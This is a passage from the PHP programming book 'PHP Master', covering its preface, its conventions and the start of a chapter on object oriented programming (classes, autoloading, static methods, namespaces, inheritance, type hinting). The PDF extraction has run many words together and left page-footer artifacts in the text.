Installing Extensions  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 324
Compiling Extensions by Hand  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 326
Creating P ackages  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 329
Package V ersioning  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 334
Creating a Channel  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 336
Now What?  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 340
Appendix B SPL: The Standard PHP
Library  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 343
ArrayAccess  and ArrayObject  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 343
Autoloading  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 344
Working with Dir ectories and Files  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 345
Countable  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 348
Data Structur es . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 349
Fixed-size Arr ays . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 349
Lists . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 350
Stacks and Queues  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 350
Heaps  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 351
Priority Queues  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 351
Functions  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 352xvii
www.it-ebooks.info
Appendix C Next Steps  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 353
Keep Reading  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 353
Attending Events  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 354
User Gr oups . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 355
Online Communities  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 355
Open Sour ce Pr ojects  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 356
Index  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 359xviii
www.it-ebooks.info
Preface
PHP Master isaimed atintermediate PHP developers—those who have lefttheir
newbie status behind, andarelooking toadvance their skills andknowledge. Our
aimasauthors istoenable developers torefine their skills across anumber ofareas,
andsowe’ve picked topics thatwefelthave stood usinthebest stead togrow as
developers andprogress ourskills andcareers.
It’sexpected thatyou’ll already beworking with atleast some ofthetopics we
cover; however ,even topics thatmay already befamiliar toyouarerecommended
reading. PHP,perhaps more than many other languages, seems toattract people
from different walks oflife.There’ snosense ofdiscrimination against those with
noformal education incomputing orinweb development specifically .Sowhile
youmay beactively using several techniques laidouthere, dipping intothechapters
thatfollow could reveal new approaches, orillustrate some underlying theory that’s
new toyou. Itispossible togoalong way with thetricks youpick upinyour day-
to-day work, butifyou’re looking tocement those skills andgain amore solid
footing, you’re intheright place.
This book will assist youinmaking thatleap from competent web developer to
confident software engineer—one who uses best practice, andgetsthejobdone re-
liably andquickly .Because we’re writing PHP asaway tomake aliving, justlike
many ofyoudo,weusea“how to”approach. Theaimistogive youpractical,
useful advice with realexamples asyoumove through thesections ofthebook.
Whatever path brought youhere, wehope youfind what you’re looking for,and
wish youthebest ofeverything asyoutravel onwards.
Who Should Read This Book
Asstated, PHP Master iswritten fortheintermediate developer .This means you
should have asolid grounding inthefundamentals ofPHP—the syntax underpinning
thecode, how functions andvariables operate, constructs likeforeach loops and
if/else statements, andhow server -side scripts interact with client-side markup
(with HTML forms, forinstance). Wewon’t berehashing thebasics—although
there’ll beplenty ofreferences toconcepts youshould already befamiliar with, and
www.it-ebooks.info
you’ll belearning new ways toimprove upon your existing techniques ofgenerating
server -side applications.
We’regoing towork toanobject oriented programming game plan—and ifthat’sa
term you’ve heard mentioned before, you’ll certainly behearing alotmore ofitas
youprogress through thisbook! OOP,asit’scommonly known, isastandard to
which good PHP developers adhere toensure compliance with best practice, and
tomake their code work asefficiently aspossible. You’ll learn how touseOOP to
your advantage—creating classes, instantiating objects, andtightening your coding
processes, generating some handy templates forfuture projects enroute. Ifyou’re
already familiar with OOP,theopening chapter willserve asanexcellent refresher ,
andifnot,make sure youstart right from thebeginning togain themost from
reading PHP Master .
Inaddition, we’ll beworking with databases—a keymode ofstorage forweb applic-
ations. Abasic understanding ofwhat databases areandhow they work will help
youalong, butwe’ll becovering ways ofconnecting tothem ingreat depth, aswell
asstepping through theworld ofMySQL—the most popular query language used
tointeract with information inadatabase.
Finally ,thisbook willtackle some nifty approaches torefining, testing, anddeploy-
ingyour code. While these concepts aresomewhat advanced, thorough explanations
will beprovided. Afamiliarity with command lineinterfaces andtheir associated
vocabularies will beofassistance inthese chapters.
What’ s in This Book
This book comprises eight chapters andthree appendices. While most chapters
follow onfrom each other ,they each deal with anew topic. You’ll probably gain
themost benefit from reading them insequence, butyoucancertainly skip around
ifyouonly need arefresher onaparticular subject.
Chapter 1:Object Oriented Programming
We’llstart bydiscussing what object oriented programming consists of,and
look athow toassociate values andfunctions together inoneunit: theobject.
Declaring classes andinstantiating objects willbecovered tostart usoffonour
OOP journey; then we’ll delve into inheritance, interfaces, andexceptionxx
www.it-ebooks.info
handling. We’llhave athorough OOP blueprint towork tobytheendofthis
chapter .
Chapter 2:Databases
TheWebisadynamic world—gone arethedays where users simply sitback
andread web pages. Databases areakeycomponent ofinteractive server -side
development. Inthischapter ,we’ll discover how toconnect toadatabase with
thePDO extension, andhow tostore data anddesign database schema. Inaddi-
tion, we’ll look atthestructured query language MySQL, aswell asthecom-
mands youneed toknow tointeract with adatabase.
Chapter 3:APIs
Application Programming Interfaces areaway oftransferring data other than
viaweb page-based methods; they provide thelink thataparticular service,
application, ormodule exposes forothers tointeract with. We’lllook athow to
incorporate them intoyour system, aswell asinvestigate service-oriented archi-
tecture (SOA), HTTP requests andresponses, andalternative web services.
Chapter 4:Design Patterns
Intherealworld, repeated tasks have best practices, andincoding, wecall
these design patterns; they help PHP users optimize development andmainten-
ance. Inthischapter ,we’ll cover awide range ofdesign patterns, including
singletons, factories, iterators, andobservers. We’llalso take atour oftheMVC
(Model-V iew-Controller) architecture thatunderpins awell-structured applica-
tion.
Chapter 5:Security
Alltechnologies have some level ofcapability formisuse inthehands ofthose
with illintentions, andevery good programmer must know thebesttechniques
formaking their systems assecure aspossible—after all,your clients willdemand
it.Inthischapter ,we’ll cover abroad range ofknown attack vectors—including
cross-site scripting, session hijacking, andSQL injection—and how toprotect
your application from malicious entry .We’lllearn how tohash passwords and
repel brute force attacks, aswell asdissect thePHP mantra: “filter input, escape
output.”xxi
www.it-ebooks.info
Chapter 6:Performance
Thebigger your application becomes, thegreater theneed totestitsperformance
capabilities. Here we’ll learn how to“stress test” ourcode using tools like
ApacheBench andJMeter ,thebest way ofoptimizing ourserver configuration,
andcover strategies forstreamlining filesystems andprofiling your code’ sac-
tions.
Chapter 7:Automated Testing
Asthefunctionality ofanapplication changes, sodoes itsdefinition ofcorrect
behavior .Thepurpose ofautomated testing istoassure thatyour application’ s
intended behavior anditsactual behavior areconsistent. Inthischapter ,we’ll
learn how totarget specific facets ofyour application with unit testing, database
testing, systems testing, andload testing.
Chapter 8:Quality Assurance
Ofcourse, allthehard work you’ve putintocreating your application shouldn’t
gotowaste; youwant your project tobeofahigh standard. Inthischapter ,we’ll
look atmeasuring quality with static analysis tools, resources youcanuseto
maintain best-practice coding standards andperfect your documentation, and
robust methods ofdeploying your project ontheWeb.
Appendix A:PEAR andPECL
Somany ofthetools werefer toreside inthePEAR andPECL repositories, and
yetwe’ve metplenty ofPHP developers who areyettousethem. Inthisap-
pendix, weprovide fullinstructions forsetting these up,sothere’ snolonger
anexcuse forbeing ignorant ofthejewels within.
Appendix B:SPL: TheStandard PHP Library
TheStandard PHP Library isafabulous andunder -celebrated extension that
ships asstandard with PHP andcontains some very powerful tools toinclude
inyour application. This isespecially worth aread asafollow-on totheOOP
andDesign Patterns chapters.
Appendix C:Next Steps
Where tofrom here? Agood PHP developer never stops improving their skill
set,andhere you’ll find ahandy listofresources, from community groups to
conferences.xxii
www.it-ebooks.info
Wher e to Find Help
SitePoint hasathriving community ofweb designers anddevelopers ready and
waiting tohelp yououtifyouruninto trouble. Wealso maintain alistofknown
errata forthebook, which youcanconsult forthelatest updates.
The SiteP oint Forums
TheSitePoint Forums1arediscussion forums where youcanaskquestions about
anything related toweb development. Youmay,ofcourse, answer questions too.
That’ show aforum siteworks—some people ask,some people answer ,andmost
people doabitofboth. Sharing your knowledge benefits others andstrengthens
thecommunity .Alotofinteresting andexperienced web designers anddevelopers
hang outthere. It’sagood way tolearn new stuff, have questions answered ina
hurry ,andgenerally have ablast.
The Book’ s Website
Located athttp://www .sitepoint.com/books/phppro/ ,thewebsite thatsupports this
book will give youaccess tothefollowing facilities:
The Code Ar chive
Asyouprogress through thisbook, you’ll note anumber ofreferences tothecode
archive. This isadownloadable ZIParchive thatcontains theexample source code
printed inthisbook. Ifyouwant tocheat (orsave yourself from carpal tunnel syn-
drome), goahead anddownload thearchive.2
Updates and Err ata
Nobook isperfect, andweexpect thatwatchful readers will beable tospot atleast
oneortwomistakes before theendofthisone. TheErrata page3onthebook’ s
website will always have thelatest information about known typographical and
code errors.
1http://www .sitepoint.com/forums/
2http://www .sitepoint.com/books/phppro/code.php
3http://www .sitepoint.com/books/phppro/errata.phpxxiii
www.it-ebooks.info
The SiteP oint Newsletters
Inaddition tobooks likethisone, SitePoint publishes freeemail newsletters, such
astheSitePoint TechTimes ,SitePoint Tribune ,andSitePoint Design View,toname
afew.Inthem, you’ll read about thelatest news, product releases, trends, tips, and
techniques forallaspects ofweb development. Sign uptooneormore SitePoint
newsletters athttp://www .sitepoint.com/newsletter/ .
The SiteP oint P odcast
Join theSitePoint Podcast team fornews, interviews, opinion, andfresh thinking
forweb developers anddesigners. Wediscuss thelatest web industry topics, present
guest speakers, andinterview some ofthebestminds intheindustry .Youcancatch
uponthelatest andprevious podcasts athttp://www .sitepoint.com/podcast/ ,or
subscribe viaiTunes.
Your Feedback
Ifyou’re unable tofind ananswer through theforums, orifyouwish tocontact us
foranyother reason, thebest place towrite isbooks@sitepoint.com .Wehave a
well-staffed email support system setuptotrack your inquiries, andifoursupport
team members can’t answer your question, they’ll send itstraight tous.Suggestions
forimprovements, aswell asnotices ofanymistakes youmay find, areespecially
welcome.
Acknowledgments
Lorna Mitchell
I’dliketosayabigthank youtothefriends who told metostop talking about
writing abook, andjustwrite one. I’dalso liketothank those who tricked meinto
realizing thatIcould write, even though Ithought Iwasasoftware developer .The
team atSitePoint were wonderful, notjustwith thewords thatIwrote butalsowith
getting methrough thewriting process, asIwasacomplete newbie! And lastbut
very definitely notleast, myco-authors, whom I’mproud tocallfriends, andwho
shared thisexperience with me—rock stars, both ofyou.xxiv
www.it-ebooks.info
Davey Shafik
First andforemost, Iwant tosayabigthank youtomywife, Frances, forputting
upwith thelatenights andlostweekends thatwent into thisbook. I’dalso liketo
thank myvery talented co-authors, who I’mfortunate tobeable toconsider great
friends. Thank youtothegreat team atSitePoint fortheir efforts inputting together
thisgreat book. Finally ,thank youtoyou, thereader ,fortaking thetime toread this
book; Ihope itnotonly answers some questions, butopens your mind tomany
more tocome.
Matthew T urland
Ifound PHP in2002, andlater itscommunity around 2006. Icame forthetechnology ,
butstayed forthepeople. It’sbeen oneofthebest communities I’vefound inmy
time asasoftware developer andI’mprivileged tobeapartofit.Thanks toeveryone
who’ sshared inthatexperience with me,especially those who have befriended and
guided meover theyears. Thanks tomyspectacular co-authors, Lorna andDavey;
Icould nothave asked forbetter partners inthisproject, norbetter friends with
which toshare it.Thanks totheexcellent SitePoint team ofKelly Steele, Tom
Museth, Sarah Hawk, andLisa Lang, who helped bring usandthepieces ofthis
project together toproduce thepolished book thatyouseenow.Thanks also toour
reviewer Luke Cawood, andmyfriends Paddy Foran andMark Harris, allofwhom
provided feedback onthebook asitwasbeing written. Finally ,thanks toyou, the
reader; Ihope youenjoy thisbook andthatithelps tobring youforward with PHP.
Conventions Used in This Book
You’ll notice thatwe’ve used certain typographic andlayout styles throughout the
book tosignify different types ofinformation. Firstly ,because thisisabook about
PHP,we’ve dispensed with theopening andclosing tags(<?php and?>)inmost
code examples andassumed you’ll have them inserted inyour own files. Theonly
exception iswhere PHP isprinted alongside, say,XML orHTML.
Look outforthefollowing items:
Code Samples
Code inthisbook will bedisplayed using afixed-width font, likeso:xxv
www.it-ebooks.info
class Courier { public function __construct($name) {
      $this->name = $name; return true; } }
Ifthecode istobefound inthebook’ scode archive, thename ofthefilewillappear
atthetopoftheprogram listing, likethis:
example.php
function __autoload($classname) { include
        strtolower($classname) . '.php'; }
Ifonly part ofthefileisdisplayed, thisisindicated bytheword excerpt :
example.php  (excerpt)
$mono = new Courier('Monospace
        Delivery');
Ifadditional code istobeinserted into anexisting example, thenew code will be
displayed inbold:
function animate() { new_variable =
      "Hello";  }
Where existing code isrequired forcontext, rather than repeat allthecode, avertical
ellipsis will bedisplayed:
function animate() { ⋮ return
      new_variable;  }
Some  lines  of code  are intended  to be entered  on one line, but we’ve  had to wrap
them  because  of page constraints.  A ➥ indicates  a line break  that exists  for formatting
purposes  only, and should  be ignored:
URL.open("http://www.sitepoint.com/blogs/2007/05/28/user-style-she
      ➥ets-come-of-age/");xxvi
www.it-ebooks.info
Tips, Notes , and W arnings
Hey, You!
Tipswill give youhelpful little pointers.
Ahem, Excuse Me …
Notes areuseful asides thatarerelated—but notcritical—to thetopic athand.
Think ofthem asextra tidbits ofinformation.
Make Sur e You Always …
…payattention tothese important points.
Watch Out!
Warnings will highlight anygotchas thatarelikely totripyouupalong theway.xxvii
www.it-ebooks.info
www.it-ebooks.info
Chapter1
Object Oriented Pr ogramming
Inthischapter ,we’ll betaking alook atobject oriented programming, orOOP.
Whether you’ve used OOP before inPHP ornot,thischapter will show youwhat
itis,how it’sused, andwhy youmight want touseobjects rather than plain functions
andvariables. We’llcover everything from the“this ishow youmake anobject”
basics through tointerfaces, exceptions, andmagic methods. Theobject oriented
approach ismore conceptual than technical—although there aresome long words
used thatwe’ll define anddemystify aswego!
Why OOP?
Since it’sclearly possible towrite complex anduseful websites using only functions,
youmight wonder why taking another step andusing OOP techniques isworth the
hassle. Thetrue value ofOOP—and thereason why there’ ssuch astrong move to-
wards itinPHP—is encapsulation .This means itallows ustoassociate values and
functions together inoneunit: theobject. Instead ofhaving variables with prefixes
sothatweknow what they relate to,orstored inarrays tokeep elements together ,
using objects allows ustocollect values together ,aswell asaddfunctionality to
thatunit.
www.it-ebooks.info
Vocabulary of OOP
What sometimes puts people offfrom working with objects isthetendency touse
bigwords torefer toperfectly ordinary concepts. Sotoavoid deterring you, we’ll
begin with ashort vocabulary list:
class therecipe orblueprint forcreating anobject
object athing
instantiate theaction ofcreating anobject from aclass
method afunction thatbelongs toanobject
property avariable thatbelongs toanobject
Armed now with your new foreign-language dictionary ,let’smove onandlook at
some code.
Introduction to OOP
Theadventure starts here. We’llcover thetheoretical side, butthere will beagood
mixofrealcode examples too—sometimes it’smuch easier toseethese ideas in
code!
Declaring a Class
Theclass isablueprint—a setofinstructions forhow tocreate anobject. Itisn’t a
realobject—it justdescribes one. Inourweb applications, wehave classes torep-
resent allsorts ofentities. Here’ saCourier class thatmight beused inanecommerce
application:
chapter_01/simple_class.php
class Courier
{
  public $name;
  public $home_country;
  public function __construct($name) {
    $this->name = $name;
    return true;
  }
  public function ship($parcel) {PHP Master: W rite Cutting-edge Code 2
www.it-ebooks.info
    // sends the parcel to its destination
    return true;
  }
}
This shows theclass declaration, andwe’ll store itinafilecalled courier .php.This
file-naming method isanimportant point toremember ,andthereason forthiswill
become clearer aswemove ontotalkabout how toaccess class definitions when
weneed them, inthesection called “Object Inheritance” .
Theexample above shows twoproperties, $name and$home_country ,andtwo
methods, __construct() andship() .Wedeclare methods inclasses exactly the
same way aswedeclare functions, sothissyntax will befamiliar .Wecanpass in
parameters tothemethod andreturn values from themethod inthesame way we
would when writing afunction.
Youmight also notice avariable called$this intheexample. It’saspecial variable
that’salways available inside anobject’ sscope, anditrefers tothecurrent object.
We’lluseitthroughout theexamples inthischapter toaccess properties orcall
methods from inside anobject, solook outforitasyouread on.
Class Constructors
The__construct() function hastwounderscores atthestart ofitsname. InPHP,
twounderscores denote amagic method ,amethod thathasaspecial meaning or
function. We’llseeanumber ofthese inthischapter .The__construct() method
isaspecial function that’scalled when weinstantiate anobject, andwecallthis
theconstructor .
PHP 4 Constructors
InPHP 4,there were nomagic methods .Objects hadconstructors, andthese were
functions thathadthesame name astheclass they were declared in.Although
they’re nolonger used when writing modern PHP,youmay seethisconvention
inlegacy orPHP 4-compatible code, andPHP 5does support them.
Theconstructor isalways called when weinstantiate anobject, andwecanuseit
tosetupandconfigure theobject before werelease itforuseinthecode. Thecon-
structor also hasamatching magic method called adestructor ,which takes the3 Object Oriented Pr ogramming
www.it-ebooks.info
method name__destruct() with noarguments. Thedestructor iscalled when the
object isdestroyed, andallows ustorunanyshut-down orclean-up tasks thisobject
needs. Beaware, though, thatthere’ snoguarantee about when thedestructor will
berun; itwill happen after theobject isnolonger needed—either because itwas
destroyed orbecause itwent outofscope—but only when PHP’ sgarbage collection
happens.
We’llseeexamples ofthese andother magic methods aswegothrough theexamples
inthischapter .Right now,though, let’sinstantiate anobject—this willshow nicely
what aconstructor actually does.
Instantiating an Object
Toinstantiate—or create—an object, we’ll usethenewkeyword andgive thename
oftheclass we’d likeanobject of;then we’ll pass inanyparameters expected by
theconstructor .Toinstantiate acourier ,wecandothis:
require 'courier.php'; 
$mono = new Courier('Monospace Delivery'); 
First ofall,werequire thefilethatcontains theclass definition (courier .php),asPHP
will need thistobeable tomake theobject. Then wesimply instantiate anew
Courier object, passing inthename parameter thattheconstructor expects, and
storing theresulting object in$mono .Ifweinspect ourobject usingvar_dump() ,
we’ll see:
object(Courier)#1 (2) {
 ["name"]=>
 string(18) "Monospace Delivery"
 ["home_country"]=>
 NULL 
} 
Thevar_dump() output tells us:
■thisisanobject ofclassCourier
■ithastwoproperties
■thename andvalue ofeach propertyPHP Master: W rite Cutting-edge Code 4
www.it-ebooks.info
Passing intheparameter when weinstantiate theobject passes thatvalue tothe
constructor .Inourexample, theconstructor inCourier simply setsthatparameter’ s
value tothe$name property oftheobject.
Autoloading
Sofar,ourexamples have shown how todeclare aclass, then include thatfilefrom
theplace wewant touseit.This cangrow confusing andcomplicated quite quickly
inalarge application, where different files might need tobeincluded indifferent
scenarios. Happily ,PHP hasafeature tomake thiseasier ,called autoload .Autoload-
ingiswhen wetellPHP where tolook forourclass files when itneeds aclass de-
claration thatit’syettosee.
Todefine therules forautoloading, weuseanother magic method:__autoload() .
Intheearlier example, weincluded thefile,butasanalternative, wecould change
ourexample tohave anautoload function:
function __autoload($classname) {
  include strtolower($classname) . '.php';
}
Autoloading isonly useful ifyouname andstore thefiles containing your class
definitions inavery predictable way.Ourexample, sofar,hasbeen trivial; ourclass
files liveinsame-named, lowercase filenames with a.php extension, sotheautoload
function handles thiscase.
Itispossible tomake acomplex autoloading function ifyouneed one. Forexample,
many modern applications arebuilt onanMVC (Model-V iew-Controller—see
Chapter 4foranin-depth explanation) pattern, andtheclass definitions forthe
models, views, andcontrollers areoften indifferent directories. Togetaround this,
youcanoften have classes with names thatindicate theclass type, such as
UserController .Theautoloading function willthen have some string matching or
aregular expression tofigure outthekind ofaclass it’slooking for,andwhere to
find it.
Using Objects
Sofarwe’ve declared anobject, instantiated anobject, andtalked about autoloading,
butwe’re yettodomuch object oriented programming. We’llwant towork with5 Object Oriented Pr ogramming
www.it-ebooks.info
both properties andmethods oftheobjects wecreate, solet’sseesome example
code fordoing exactly that:
$mono = new Courier('Monospace Delivery');
// accessing a property
echo "Courier Name: " . $mono->name;
// calling a method
$mono->ship($parcel);
Here, weusetheobject operator ,which isthehyphen followed bythegreater -than
sign:->.This goes between theobject andtheproperty—or method—you want to
access. Methods have parentheses after them, whereas properties donot.
Using Static Pr operties and Methods
Having shown some examples ofusing classes, andexplained thatweinstantiate
objects tousethem, thisnext item isquite ashift inconcept. Aswell asinstantiating
objects, wecandefine class properties andmethods thatarestatic .Astatic method
orproperty isonethatcanbeused without instantiating theobject first. Ineither
case, youmark anelement asstatic byputting thestatic keyword afterpublic (or
other visibility modifier—more onthose later inthischapter). Weaccess them by
using thedouble colon operator ,simply::.
Scope Resolution Oper ator
Thedouble colon operator thatweuseforaccessing static properties ormethods
inPHP istechnically called thescope resolution operator .Ifthere’ saproblem
with some code containing ::,youwill often seeanerror message containing
T_PAAMAYIM_NEKUDOTAYIM .This simply refers tothe::,although itlooks quite
alarming atfirst! “Paamayim Nekudotayim” means “two dots, twice” inHebrew .
Astatic property isavariable thatbelongs totheclass only,notanyobject. Itis
isolated entirely from anyproperty ,even oneofthesame name inanobject ofthis
class.
Astatic method isamethod thathasnoneed toaccess anyother part oftheclass.
Youcan’t refer to$this inside astatic method, because noobject hasbeen created
torefer to.Static properties areoften seen inlibraries where thefunctionality isPHP Master: W rite Cutting-edge Code 6
www.it-ebooks.info
independent ofanyobject properties. Itisoften used asakind ofnamespacing (PHP
didn’t have namespaces until version 5.3;seethesection called “Objects and
Namespaces” ),andisalsouseful forafunction thatretrieves acollection ofobjects.
Wecanaddafunction likethattoourCourier class:
chapter_01/Courier .php (excerpt)
class Courier
{
  public $name;
  public $home_country;
  public static function getCouriersByCountry($country) {
    // get a list of couriers with their home_country = $country
    // create a Courier object for each result
    // return an array of the results
    return $courier_list;
  }
}
Totake advantage ofthestatic function, wecallitwith the::operator:
// no need to instantiate any object
// find couriers in Spain:
$spanish_couriers = Courier::getCouriersByCountry('Spain');
Methods should bemarked asstatic ifyou’re going tocallthem inthisway; other -
wise, you’ll seeanerror .This isbecause amethod should bedesigned tobecalled
either statically ordynamically ,anddeclared assuch. Ifithasnoneed toaccess
$this ,itisstatic, andcanbedeclared andcalled asshown. Ifitdoes, weshould
instantiate theobject first; thus, itisn’t astatic method.
When touseastatic method ismainly apoint ofstyle. Some libraries orframeworks
usethem frequently; whereas others will always have dynamic functions, even
where they wouldn’t strictly beneeded.7 Object Oriented Pr ogramming
www.it-ebooks.info
Objects and Namespaces
Since PHP 5.3,PHP hashadsupport fornamespaces .There aretwomain aims of
thisnew feature. Thefirst istoavoid theneed forclasses with names like
Zend_InfoCard_Xml_Security_Transform_Exception ,which at47characters long
isinconvenient tohave incode (nodisrespect toZend Framework—we justhappen
toknow ithasdescriptive names, andpicked oneatrandom). Thesecond aimof
thenamespaces feature istoprovide aneasy way toisolate classes andfunctions
from various libraries. Different frameworks have different strengths, andit’snice
tobeable topick andchoose thebest ofeach touseinourapplication. Problems
arise, though, when twoclasses have thesame name indifferent frameworks; we
cannot declare twoclasses called thesame name.
Namespaces allow ustowork around thisproblem bygiving classes shorter names,
butwith prefixes. Namespaces aredeclared atthetopofafile,andapply toevery
class, function, andconstant declared inthatfile.We’llmostly belooking atthe
impact ofnamespaces onclasses, butbear inmind thattheprinciples also apply
tothese other items. Asanexample, wecould putourown code inashipping
namespace:
chapter_01/Courier .php (excerpt)
namespace shipping;
class Courier
{
  public $name;
  public $home_country;
  public static function getCouriersByCountry($country) {
    // get a list of couriers with their home_country = $country
    // create a Courier object for each result
    // return an array of the results
    return $courier_list;
  }
}
From another file,wecannolonger justinstantiate aCourier class, because ifwe
do,PHP willlook intheglobal namespace forit—and itisn’t there. Instead, werefer
toitbyitsfullname:Shipping\Courier .PHP Master: W rite Cutting-edge Code 8
www.it-ebooks.info
This works really well when we’re intheglobal namespace andalltheclasses are
intheir own tidy little namespaces, butwhat about when wewant toinclude this
class inside code inanother namespace? When thishappens, weneed toputa
leading namespace operator (that’ sabackslash, inother words) infront oftheclass
name; thisindicates thatPHP should start looking from thetopofthenamespace
stack. Sotouseournamespaced class inside anarbitrary namespace, wecando:
namespace Fred;
$courier = new \shipping\Courier();
Torefer toourCourier class, weneed toknow which namespace wearein;forin-
stance:
■IntheShipping namespace, itiscalledCourier .
■Intheglobal namespace, wecansayshipping/Courier .
■Inanother namespace, weneed tostart from thetopandrefer toitas
\shipping\Courier .
Wecandeclare anotherCourier class intheFred namespace—and wecanuseboth
objects inourcode without theerrors weseewhen redeclaring thesame class in
thetop-level namespace. This avoids theproblem where youmight want touse
elements from two(ormore) frameworks, andboth have aclass namedLog.
Namespaces canalsobecreated within namespaces, simply byusing thenamespace
separator again. How about asitewith both ablog andanecommerce function? It
might have anamespaced class structure, such as:
shop
  products
    Products
    ProductCategories
  shipping
    Courier
admin
  user
    User
OurCourier class isnow nested twolevels deep, sowe’d putitsclass definition
inafilewithshop/shipping inthenamespace declaration atthetop.Withallthese9 Object Oriented Pr ogramming
www.it-ebooks.info
prefixes inplace, youmight wonder how thishelps solve theproblem oflong class
names; allweseem tohave managed sofaristoreplace theunderscores with
namespace operators! Infact, wecanuseshorthand torefer toournamespaces, in-
cluding when there aremultiple namespaces used inonefile.
Takealook atthisexample, which uses aseries ofclasses from thestructure inthe
listwejustsaw:
use shop\shipping;
use admin\user as u;
// which couriers can we use?
$couriers = shipping\Courier::getCouriersByCountry('India');
// look up this user's account and show their name
$user = new u\User();
echo $user->getDisplayName();
Wecanabbreviate anested namespace toonly useitslowest level, aswehave with
shipping ,andwecanalso create nicknames orabbreviations touse, aswehave
withuser .This isreally useful towork around asituation where themost specific
element hasthesame name asanother .Youcangivethem distinctive names inorder
totellthem apart.
Namespaces arealso increasingly used inautoloading functions. Youcaneasily
imagine how thedirectory separators andnamespace separators canrepresent one
another .While namespaces arearelatively new addition toPHP,youaresure to
come across them inlibraries andframeworks. Now youknow how towork with
them effectively .
Object Inheritance
Inheritance istheway thatclasses relate toeach other .Much inthesame way that
weinherit biological characteristics from ourparents, wecandesign aclass that
inherits from another class (though much more predictably than thepassing ofcurly
hair from father todaughter!).
Classes caninherit from orextend oneparent class. Classes areunaware ofother
classes inheriting from them, sothere arenolimits onhow many child classes aPHP Master: W rite Cutting-edge Code 10
www.it-ebooks.info
parent class canhave. Achild class hasallthecharacteristics ofitsparent class,
andwecanaddorchange anyelements thatneed tobedifferent forthechild.
Wecantake ourCourier class asanexample, andcreate child classes foreach
Courier thatwe’ll have intheapplication. InFigure 1.1,there aretwocouriers
which inherit from theCourier class, each with their ownship() methods.
Figur e 1.1. Class diagr am showing the Courier  class and specific courier s inheriting fr om it
Thediagram uses UML (Unified Modeling Language) toshow therelationship
between theMonotypeDelivery andPigeonPost classes andtheir parent, theCourier
class. UML isacommon technique formodeling class relationships, andyou’ll see
itthroughout thisbook andelsewhere when reading documentation forOOP systems.
Theboxes aresplit intothree sections: onefortheclass name, oneforitsproperties,
andthebottom oneforitsmethods. Thearrows show theparentage ofaclass—here,
bothMonotypeDelivery andPigeonPost inherit fromCourier .Incode, thethree
classes would bedeclared asfollows:
chapter_01/Courier .php (excerpt)
class Courier
{
  public $name;
  public $home_country;
  public function __construct($name) {
    $this->name = $name;
    return true;
  }11 Object Oriented Pr ogramming
www.it-ebooks.info
  public function ship($parcel) {
    // sends the parcel to its destination
    return true;
  }
  public function calculateShipping($parcel) {
    // look up the rate for the destination, we'll invent one
    $rate = 1.78;
    // calculate the cost
    $cost = $rate * $parcel->weight;
    return $cost;
  }
}
chapter_01/MonotypeDeliver y.php (excerpt)
class MonotypeDelivery extends Courier
{
  public function ship($parcel) {
    // put in box
    // send
    return true;
  }
}
chapter_01/PigeonPost.php  (excerpt)
class PigeonPost extends Courier
{
  public function ship($parcel) {
    // fetch pigeon
    // attach parcel
    // send
    return true;
  }
}
Thechild classes show their parent using theextends keyword. This gives them
everything thatwaspresent intheCourier parent class, sothey have alltheprop-
erties andmethods itdoes. Eachcourier ships invery different ways, sothey both
redeclare theship() method andaddtheir own implementations (pseudo code isPHP Master: W rite Cutting-edge Code 12
www.it-ebooks.info
shown here, butyoucanuseyour imagination astohow toactually implement a
pigeon inPHP!).
When aclass redeclares amethod thatwasintheparent class, itmust usethesame
parameters thattheparent method did. PHP reads theextends keyword andgrabs
acopy oftheparent class, andthen anything thatischanged inthechild class es-
sentially overwrites what isthere.
Objects and Functions
We’vemade some classes torepresent ourvarious courier companies, andseen how
toinstantiate objects from class definitions. We’llnow look athow weidentify ob-
jects andpass them into object methods.
First, weneed atarget object, solet’screate aParcel class:
chapter_01/Par cel.php  (excerpt)
class Parcel
{
  public $weight;
  public $destinationAddress;
  public $destinationCountry;
}
This class isfairly simple, butthen parcels themselves arerelatively inanimate, so
perhaps that’stobeexpected!
Type Hinting
Wecanamend ourship() methods toonly accept parameters thatareParcel objects
byplacing theobject name before theparameter:
chapter_01/PigeonPost.php  (excerpt)
public function ship(Parcel $parcel) {
  // sends the parcel to its destination
  return true;
}
This iscalled type hinting ,where wecanspecify what type ofparameters areac-
ceptable forthismethod—and itworks onfunctions too.Youcantype hint any13 Object Oriented Pr ogramming
www.it-ebooks.info
object name, andyoucanalso type hint forarrays. Since PHP isrelaxed about its
data types (itisadynamically andweakly typed language), there’ snotype hinting
forsimple types such asstrings ornumeric types.
Using type hinting allows ustobesure about thekind ofobject passed intothis
